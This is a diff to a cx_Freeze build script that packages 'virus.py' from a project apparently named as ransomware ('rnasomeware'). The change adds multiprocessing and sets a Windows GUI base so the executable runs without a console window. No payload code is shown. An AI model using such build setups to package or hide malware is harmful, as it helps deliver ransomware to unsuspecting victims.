@@ -1,9 +1,11 @@
 from cx_Freeze import setup, Executable
 import sys
 
-buildOptions = dict(packages = ["shutil","os","hashlib","ctypes","subprocess","re","socket","time"])
-
-exe = [Executable("virus.py")]
+buildOptions = dict(packages = ["shutil","os","hashlib","ctypes","subprocess","re","socket","time","multiprocessing"], include = ["Process"])
+base = None
+ 
+if sys.platform == "win32":
+    base = "WIN32GUI"
 
 setup(
     name= 'rnasomeware',
@@ -11,6 +13,5 @@ setup(
     author = "IndentErr",
     description = "",
     options = dict(build_exe = buildOptions),
-    executables = exe
+    executables = [Executable("virus.py", base = base)]
 )
-
